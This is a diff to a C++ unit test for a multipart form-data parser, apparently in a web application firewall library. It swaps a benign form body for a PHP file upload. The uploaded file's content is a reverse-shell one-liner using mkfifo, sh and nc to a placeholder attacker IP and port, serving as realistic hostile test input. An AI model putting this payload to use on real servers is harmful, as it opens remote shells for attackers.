@@ -104,43 +104,37 @@ TEST(Common, multiPart) {
   EXPECT_EQ(headers_linked[2].second, "header2: value3");
 }
 
-TEST(Common, multiPart2) {
+TEST(Common, multiPartBoundaryNameNoHyphen) {
   Wge::Common::Ragel::MultiPart multi_part;
-  multi_part.init(
-      R"(multipart/form-data; boundary=---------------------------133195688030725902433810601503)",
-      R"(-----------------------------133195688030725902433810601503
-Content-Disposition: form-data; name="key"
+  multi_part.init(R"(multipart/form-data; boundary=4bsbcsb)",
+                  R"(--4bsbcsb
+Content-Disposition: form-data; name="upload"
 
-e71bc53f1cb88666d160c1e2
------------------------------133195688030725902433810601503
-Content-Disposition: form-data; name="request_type"
+sdbdb
+--4bsbcsb
+Content-Disposition: form-data; name="per_file"; filename="4564.php"
+Content-Type: application/x-php
 
-banner_hide
------------------------------133195688030725902433810601503
-Content-Disposition: form-data; name="event_log_time"
-
-1736020996
------------------------------133195688030725902433810601503
-Content-Disposition: form-data; name="payload"
-
-{"consent_session_id":"VUJVV3JvNW03SUxuV1V0YmhhQnR5SXFpOFc3UUhiQTU","banner_id":""}
------------------------------133195688030725902433810601503--)",
-      3);
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {random_attacker_ip} {random_attacker_port} >/tmp/f"); ?>
+--4bsbcsb--)",
+                  3);
   auto error = multi_part.getError();
   EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
   auto& name_value_map = multi_part.getNameValue();
   auto& name_value_linked = multi_part.getNameValueLinked();
-  EXPECT_EQ(name_value_map.size(), 4);
-  EXPECT_EQ(name_value_linked.size(), 4);
-  EXPECT_EQ(name_value_map.find("key")->second, "e71bc53f1cb88666d160c1e2\n");
-  EXPECT_EQ(name_value_map.find("request_type")->second, "banner_hide\n");
-  EXPECT_EQ(name_value_map.find("event_log_time")->second, "1736020996\n");
-  EXPECT_EQ(name_value_linked[0].first, "key");
-  EXPECT_EQ(name_value_linked[1].first, "request_type");
-  EXPECT_EQ(name_value_linked[2].first, "event_log_time");
-  EXPECT_EQ(name_value_linked[0].second, "e71bc53f1cb88666d160c1e2\n");
-  EXPECT_EQ(name_value_linked[1].second, "banner_hide\n");
-  EXPECT_EQ(name_value_linked[2].second, "1736020996\n");
+  EXPECT_EQ(name_value_map.size(), 1);
+  EXPECT_EQ(name_value_linked.size(), 1);
+  EXPECT_EQ(name_value_map.find("upload")->second, "sdbdb\n");
+  EXPECT_EQ(name_value_linked[0].first, "upload");
+  EXPECT_EQ(name_value_linked[0].second, "sdbdb\n");
+
+  auto& name_filename_map = multi_part.getNameFileName();
+  auto& name_filename_linked = multi_part.getNameFileNameLinked();
+  EXPECT_EQ(name_filename_map.size(), 1);
+  EXPECT_EQ(name_filename_linked.size(), 1);
+  EXPECT_EQ(name_filename_map.find("per_file")->second, "4564.php");
+  EXPECT_EQ(name_filename_linked[0].first, "per_file");
+  EXPECT_EQ(name_filename_linked[0].second, "4564.php");
 }
 
 TEST(Common, multiPartError) {
